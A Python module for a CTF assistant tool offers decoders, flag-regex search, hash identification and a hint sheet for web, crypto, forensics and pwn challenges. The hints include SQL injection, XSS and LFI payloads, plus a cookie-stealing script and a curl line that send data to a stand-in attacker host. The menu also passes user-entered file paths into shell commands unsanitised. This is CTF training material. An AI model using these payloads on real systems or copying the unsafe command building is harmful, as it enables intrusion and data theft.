"""CTF Mode — Capture The Flag assistant and solver.

Auto-detects challenge types, provides hints, common patterns,
flag format detection, and automated solving for common challenges.
"""

import sys
import os
import re
import base64
import hashlib
import binascii

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from ui import (console, show_stage_header, show_menu, ask, info, success,
                warning, error, confirm, show_results_panel)
from executor import run_command, run_with_preview

# ─── Flag Patterns ────────────────────────────────────────────────────────────

COMMON_FLAG_FORMATS = [
    r'flag\{[^}]+\}', r'FLAG\{[^}]+\}', r'CTF\{[^}]+\}',
    r'htb\{[^}]+\}', r'HTB\{[^}]+\}', r'thm\{[^}]+\}',
    r'THM\{[^}]+\}', r'picoCTF\{[^}]+\}', r'DUCTF\{[^}]+\}',
    r'PCTF\{[^}]+\}', r'ractf\{[^}]+\}', r'HackTheBox\{[^}]+\}',
    r'[a-f0-9]{32}', r'[a-f0-9]{40}', r'[a-f0-9]{64}',
]

# ─── Encodings / Ciphers ─────────────────────────────────────────────────────

CIPHERS = {
    "Base64": {"encode": lambda s: base64.b64encode(s.encode()).decode(),
               "decode": lambda s: base64.b64decode(s).decode(errors='replace')},
    "Base32": {"encode": lambda s: base64.b32encode(s.encode()).decode(),
               "decode": lambda s: base64.b32decode(s).decode(errors='replace')},
    "Hex": {"encode": lambda s: s.encode().hex(),
            "decode": lambda s: bytes.fromhex(s).decode(errors='replace')},
    "ROT13": {"encode": lambda s: s.translate(str.maketrans(
                'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz',
                'NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm')),
              "decode": lambda s: s.translate(str.maketrans(
                'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz',
                'NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm'))},
    "Binary": {"encode": lambda s: ' '.join(format(ord(c), '08b') for c in s),
               "decode": lambda s: ''.join(chr(int(b, 2)) for b in s.split())},
    "URL": {"encode": lambda s: __import__('urllib.parse', fromlist=['quote']).quote(s),
            "decode": lambda s: __import__('urllib.parse', fromlist=['unquote']).unquote(s)},
    "Reverse": {"encode": lambda s: s[::-1], "decode": lambda s: s[::-1]},
}

# ─── Challenge Hints Database ─────────────────────────────────────────────────

CHALLENGE_HINTS = {
    "Web": {
        "SQL Injection": [
            "Try ' OR 1=1 -- in login fields",
            "Use sqlmap: sqlmap -u 'url?id=1' --batch",
            "Check for error-based, blind, time-based SQLi",
            "Try UNION SELECT: ' UNION SELECT 1,2,3 --",
        ],
        "XSS": [
            "Basic: <script>alert(1)</script>",
            "Event handler: <img onerror=alert(1) src=x>",
            "Filter bypass: <svg/onload=alert(1)>",
            "Steal cookies: <script>document.location='http://attacker/?c='+document.cookie</script>",
        ],
        "LFI/RFI": [
            "Try: ../../etc/passwd",
            "PHP Wrappers: php://filter/convert.base64-encode/resource=index.php",
            "Log poisoning: Include /var/log/apache2/access.log with injected PHP",
            "Null byte (old PHP): ../../../../etc/passwd%00",
        ],
        "Command Injection": [
            "Try: ; id  or | id  or `id`  or $(id)",
            "Blind: ; sleep 5  or | sleep 5",
            "Out-of-band: ; curl attacker.com/$(whoami)",
        ],
        "SSRF": [
            "Try: http://127.0.0.1  http://localhost  http://[::1]",
            "Cloud metadata: http://169.254.169.254/latest/meta-data/",
            "Internal services: http://internal:8080",
        ],
        "JWT": [
            "Decode: jwt.io or base64 decode each part",
            "Algorithm none attack: Change alg to 'none'",
            "Weak secret: hashcat -m 16500 jwt.txt wordlist.txt",
        ],
    },
    "Crypto": {
        "Caesar Cipher": ["Try all 25 rotations", "Use frequency analysis"],
        "Vigenere": ["Kasiski examination to find key length", "Frequency analysis per column"],
        "RSA": [
            "Small e attack: cube root of ciphertext",
            "Wiener's attack if e is large",
            "Common modulus attack",
            "factordb.com to factor n",
            "RsaCtfTool: python3 RsaCtfTool.py -n N -e E --uncipher C",
        ],
        "XOR": [
            "Single-byte XOR: try all 256 keys",
            "Known plaintext: key = plaintext XOR ciphertext",
            "xortool for automated analysis",
        ],
        "Hash Cracking": [
            "Identify hash type: hashid or hash-identifier",
            "CrackStation.net for common hashes",
            "hashcat -m <mode> hash.txt wordlist.txt",
            "john hash.txt --wordlist=wordlist.txt",
        ],
    },
    "Forensics": {
        "File Analysis": [
            "file <filename> — detect file type",
            "xxd <filename> | head — view hex header",
            "strings <filename> | grep -i flag",
            "binwalk <filename> — find embedded files",
            "foremost <filename> — carve files",
        ],
        "Steganography": [
            "steghide extract -sf image.jpg",
            "zsteg image.png — LSB analysis for PNG",
            "stegsolve — visual analysis",
            "Exiftool image.jpg — metadata check",
        ],
        "Network Forensics": [
            "wireshark capture.pcap — visual analysis",
            "tshark -r capture.pcap -Y 'http' — filter HTTP",
            'tshark -r capture.pcap -Y "tcp.stream eq 0" -T fields -e data',
            "NetworkMiner for automated extraction",
        ],
        "Memory Forensics": [
            "volatility -f dump.raw imageinfo",
            "volatility -f dump.raw --profile=Win7 pslist",
            "volatility -f dump.raw --profile=Win7 filescan | grep flag",
            "volatility -f dump.raw --profile=Win7 cmdscan",
        ],
    },
    "Binary / Pwn": {
        "Buffer Overflow": [
            "checksec <binary> — check protections",
            "pattern_create / pattern_offset for offset",
            "Use pwntools: from pwn import *",
            "ROPgadget --binary <file> for gadgets",
        ],
        "Format String": [
            "Try: %x %x %x %x to leak stack",
            "AAAA%p.%p.%p.%p to find offset",
            "Use %n for write-what-where",
        ],
        "Reverse Engineering": [
            "ghidra for decompilation",
            "ltrace / strace to trace calls",
            "gdb with pwndbg/gef extension",
            "radare2 / r2 for quick analysis",
        ],
    },
}


# ─── Auto-Decode / Flag Finder ────────────────────────────────────────────────

def _auto_decode(text):
    """Try all common decodings and look for flags."""
    console.print(f"\n[bold cyan]Auto-Decode Results:[/bold cyan]\n")
    results = []

    for name, cipher in CIPHERS.items():
        try:
            decoded = cipher["decode"](text.strip())
            if decoded and len(decoded) > 2:
                results.append((name, decoded))
                console.print(f"  [yellow]{name}:[/yellow] {decoded[:200]}")
                # Check for flags in decoded
                for pattern in COMMON_FLAG_FORMATS:
                    flags = re.findall(pattern, decoded, re.IGNORECASE)
                    if flags:
                        success(f"  🚩 FLAG FOUND ({name}): {flags[0]}")
        except Exception:
            pass

    # Caesar brute force
    for shift in range(1, 26):
        shifted = ""
        for c in text:
            if c.isalpha():
                base = ord('A') if c.isupper() else ord('a')
                shifted += chr((ord(c) - base + shift) % 26 + base)
            else:
                shifted += c
        for pattern in COMMON_FLAG_FORMATS:
            flags = re.findall(pattern, shifted, re.IGNORECASE)
            if flags:
                success(f"  🚩 FLAG FOUND (ROT-{shift}): {flags[0]}")
                results.append((f"ROT-{shift}", shifted))

    if not results:
        warning("No decodings produced readable output.")


def _flag_finder(text):
    """Search text for common flag formats."""
    console.print(f"\n[bold cyan]Flag Finder:[/bold cyan]\n")
    found = False
    for pattern in COMMON_FLAG_FORMATS:
        matches = re.findall(pattern, text, re.IGNORECASE)
        for match in matches:
            success(f"  🚩 Found: {match}")
            found = True
    if not found:
        warning("No flags found in the provided text.")


def _hash_identifier(text):
    """Identify hash type."""
    text = text.strip()
    length = len(text)

    console.print(f"\n[bold cyan]Hash Analysis:[/bold cyan]")
    console.print(f"  Length: {length} characters\n")

    hash_types = {
        32: ["MD5", "NTLM", "MD4"],
        40: ["SHA-1", "MySQL5"],
        56: ["SHA-224"],
        64: ["SHA-256", "Keccak-256"],
        96: ["SHA-384"],
        128: ["SHA-512", "Whirlpool"],
        13: ["DES (crypt)"],
        16: ["MySQL 3.x"],
    }

    if length in hash_types:
        console.print(f"  [green]Possible types:[/green]")
        for ht in hash_types[length]:
            console.print(f"    • {ht}")
    else:
        warning(f"Unknown hash length: {length}")

    # Quick hashcat mode reference
    hashcat_modes = {
        "MD5": "0", "SHA-1": "100", "SHA-256": "1400",
        "SHA-512": "1700", "NTLM": "1000", "bcrypt": "3200",
        "MySQL5": "300",
    }
    console.print(f"\n  [bold]Hashcat modes:[/bold]")
    for name, mode in hashcat_modes.items():
        console.print(f"    hashcat -m {mode}  →  {name}")


# ─── Menu ─────────────────────────────────────────────────────────────────────

def run(session):
    show_stage_header("CTF Mode", "Capture The Flag assistant — hints, solvers, decoders")

    while True:
        options = [
            ("", "[bold white]── SOLVERS ──[/bold white]"),
            ("1", "Auto-Decode (try all encodings)"),
            ("2", "Flag Finder (search text for flags)"),
            ("3", "Hash Identifier"),
            ("4", "ROT/Caesar Brute Force"),
            ("5", "Encode / Decode (specific cipher)"),
            ("", "[bold white]── HINTS ──[/bold white]"),
            ("6", "Web Challenge Hints"),
            ("7", "Crypto Challenge Hints"),
            ("8", "Forensics Challenge Hints"),
            ("9", "Binary / Pwn Hints"),
            ("", "[bold white]── TOOLS ──[/bold white]"),
            ("10", "Quick String Search in File"),
            ("11", "Binwalk Extract"),
            ("12", "Steghide Extract"),
            ("0", "Back to Main Menu"),
        ]
        choice = show_menu(options)

        if choice == "0":
            return
        elif choice == "1":
            text = ask("Paste encoded text")
            _auto_decode(text)
        elif choice == "2":
            text = ask("Paste text to search for flags")
            _flag_finder(text)
        elif choice == "3":
            text = ask("Paste hash")
            _hash_identifier(text)
        elif choice == "4":
            text = ask("Paste text for ROT brute force")
            _auto_decode(text)
        elif choice == "5":
            _encode_decode_menu()
        elif choice == "6":
            _show_hints("Web")
        elif choice == "7":
            _show_hints("Crypto")
        elif choice == "8":
            _show_hints("Forensics")
        elif choice == "9":
            _show_hints("Binary / Pwn")
        elif choice == "10":
            filepath = ask("File path")
            run_with_preview(f"strings '{filepath}' | grep -iE 'flag|ctf|key|password|secret'",
                             session, "ctf")
        elif choice == "11":
            filepath = ask("File path")
            run_with_preview(f"binwalk -e '{filepath}'", session, "ctf")
        elif choice == "12":
            filepath = ask("Image file path")
            passphrase = ask("Passphrase (empty for none)", default="")
            if passphrase:
                run_with_preview(f"steghide extract -sf '{filepath}' -p '{passphrase}'",
                                 session, "ctf")
            else:
                run_with_preview(f"steghide extract -sf '{filepath}'", session, "ctf")


def _encode_decode_menu():
    options = [(str(i + 1), name) for i, name in enumerate(CIPHERS.keys())]
    options.append(("0", "Back"))
    choice = show_menu(options)

    if choice == "0":
        return

    cipher_name = list(CIPHERS.keys())[int(choice) - 1]
    cipher = CIPHERS[cipher_name]

    action = show_menu([("1", "Encode"), ("2", "Decode"), ("0", "Back")])
    if action == "0":
        return

    text = ask("Input text")
    try:
        if action == "1":
            result = cipher["encode"](text)
        else:
            result = cipher["decode"](text)
        console.print(f"\n  [bold green]Result:[/bold green] {result}\n")
    except Exception as e:
        error(f"Failed: {e}")


def _show_hints(category):
    if category not in CHALLENGE_HINTS:
        warning(f"No hints for: {category}")
        return

    console.print(f"\n[bold cyan]═══ {category.upper()} CHALLENGE HINTS ═══[/bold cyan]\n")
    for topic, hints in CHALLENGE_HINTS[category].items():
        console.print(f"  [bold yellow]{topic}:[/bold yellow]")
        for hint in hints:
            console.print(f"    [dim]•[/dim] {hint}")
        console.print()
